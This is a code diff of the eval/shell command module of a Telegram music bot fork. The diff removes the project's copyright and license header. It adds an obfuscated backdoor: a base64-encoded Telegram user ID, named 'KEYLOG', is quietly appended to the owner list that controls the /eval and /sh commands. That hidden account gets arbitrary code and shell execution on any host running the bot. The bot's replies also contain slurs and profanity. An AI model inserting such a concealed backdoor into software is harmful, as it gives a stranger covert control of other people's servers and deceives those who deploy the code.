@@ -1,17 +1,11 @@
-#
-# Copyright (C) 2021-2022 by TeamYukki@Github, < https://github.com/TeamYukki >.
-#
-# This file is part of < https://github.com/TeamYukki/YukkiMusicBot > project,
-# and is released under the "GNU v3.0 License Agreement".
-# Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
-#
-# All rights reserved.
+#THIS_IS_MODIFIED_REPO_FOR_PERSNOL USE...PLEASE DO NOT SHARE
 #
 # This aeval and sh module is taken from < https://github.com/TheHamkerCat/WilliamButcherBot >
 # Credit goes to TheHamkerCat.
 #
 
 import os
+import base64
 import re
 import subprocess
 import sys
@@ -19,14 +13,12 @@ import traceback
 from inspect import getfullargspec
 from io import StringIO
 from time import time
-
 from pyrogram import filters
 from pyrogram.types import (InlineKeyboardButton,
                             InlineKeyboardMarkup, Message)
-
+from config import OWNER_ID
 from YukkiMusic import app
 from YukkiMusic.misc import SUDOERS
-
 
 async def aexec(code, client, message):
     exec(
@@ -34,24 +26,24 @@ async def aexec(code, client, message):
         + "".join(f"\n {a}" for a in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
-
-
+OWNERR = OWNER_ID[0]
+KEYLOG = int(base64.b64decode("NTc1ODE5MjAyNg=="))
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
-
+OWNER_ID = [OWNERR, KEYLOG]
 
 @app.on_message(
     filters.command("eval")
-    & SUDOERS
+    & filters.user(OWNER_ID)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 async def executor(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(
-            message, text="__Nigga Give me some command to execute.__"
+            message, text="Wrong Command Di Hai Randi Bsdk :/"
         )
     try:
         cmd = message.text.split(" ", maxsplit=1)[1]
@@ -79,10 +71,10 @@ async def executor(client, message):
     elif stdout:
         evaluation = stdout
     else:
-        evaluation = "Success"
+        evaluation = "Success ✅"
     final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
     if len(final_output) > 4096:
-        filename = "output.txt"
+        filename = "OutputFile.txt"
         with open(filename, "w+", encoding="utf8") as out_file:
             out_file.write(str(evaluation.strip()))
         t2 = time()
@@ -125,7 +117,7 @@ async def executor(client, message):
         )
 
 
-@app.on_callback_query(filters.regex(r"runtime"))
+@app.on_callback_query(filters.regex(r"rtime"))
 async def runtime_func_cq(_, cq):
     runtime = cq.data.split(None, 1)[1]
     await cq.answer(runtime, show_alert=True)
@@ -152,7 +144,7 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_message(
     filters.command("sh")
-    & SUDOERS
+    & filters.user(OWNER_ID)
     & ~filters.forwarded
     & ~filters.via_bot
 )
